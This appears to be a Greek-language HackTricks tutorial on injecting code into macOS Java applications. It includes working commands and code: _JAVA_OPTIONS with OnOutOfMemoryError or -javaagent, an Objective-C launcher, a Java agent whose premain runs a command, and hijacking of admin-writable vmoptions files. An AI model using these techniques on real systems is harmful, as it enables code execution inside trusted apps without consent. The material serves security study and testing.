# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Enumeration

Βρείτε τις Java applications που είναι εγκατεστημένες στο σύστημά σας. Έχει παρατηρηθεί ότι οι Java apps στο **Info.plist** περιέχουν ορισμένες Java parameters που περιέχουν το string **`java.`**, επομένως μπορείτε να αναζητήσετε αυτό:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

Η μεταβλητή περιβάλλοντος **`_JAVA_OPTIONS`** μπορεί να χρησιμοποιηθεί για την εισαγωγή αυθαίρετων παραμέτρων Java VM κατά την εκκίνηση μιας εφαρμογής Java.<sup>[[1]](#references)</sup>
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Για να το εκτελέσετε ως νέα διεργασία και όχι ως θυγατρική της τρέχουσας διεργασίας του terminal, μπορείτε να χρησιμοποιήσετε:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Ωστόσο, αυτή η τεχνική προκαλεί ένα σφάλμα στην εφαρμογή που εκτελείται. Μια πιο stealthy εναλλακτική είναι να δημιουργήσετε έναν Java agent και να χρησιμοποιήσετε το `-javaagent`:<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
> [!CAUTION]
> Η δημιουργία του agent με **διαφορετική έκδοση Java** από αυτήν της εφαρμογής μπορεί να προκαλέσει crash τόσο στον agent όσο και στην εφαρμογή.

Όπου ο agent μπορεί να βρίσκεται:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Για να κάνετε compile τον agent, εκτελέστε:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Με το `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Και στη συνέχεια κάντε export τη μεταβλητή env και εκτελέστε την εφαρμογή Java ως εξής:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## αρχείο vmoptions

Αυτό το αρχείο υποστηρίζει τον καθορισμό **παραμέτρων Java** κατά την εκτέλεση της Java. Μπορείτε να χρησιμοποιήσετε ορισμένες από τις προηγούμενες τεχνικές για να αλλάξετε τις παραμέτρους Java και να **κάνετε τη διεργασία να εκτελεί αυθαίρετες εντολές**.\
Επιπλέον, αυτό το αρχείο μπορεί επίσης να **συμπεριλάβει άλλα αρχεία** με την οδηγία `include`, επομένως μπορείτε να αλλάξετε και ένα αρχείο που περιλαμβάνεται.

Ακόμη περισσότερο, ορισμένες εφαρμογές Java θα **φορτώσουν περισσότερα από ένα** αρχείο `vmoptions`.

Ορισμένες εφαρμογές, όπως το Android Studio, υποδεικνύουν στο **output πού αναζητούν** αυτά τα αρχεία:<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Αν δεν το κάνουν, μπορείτε να το ελέγξετε με:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Παρατηρήστε ότι το Android Studio σε αυτό το παράδειγμα προσπαθεί να φορτώσει το **`/Applications/Android Studio.app.vmoptions`**, μια τοποθεσία όπου οποιοσδήποτε χρήστης στην ομάδα **`admin` έχει δικαιώματα εγγραφής**.

## References

- [1] [OpenJDK — Ανάλυση του `_JAVA_OPTIONS` στο `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — Προδιαγραφή του package `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — Διαμόρφωση επιλογών JVM και ιδιοτήτων πλατφόρμας](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
{{#include ../../../banners/hacktricks-training.md}}
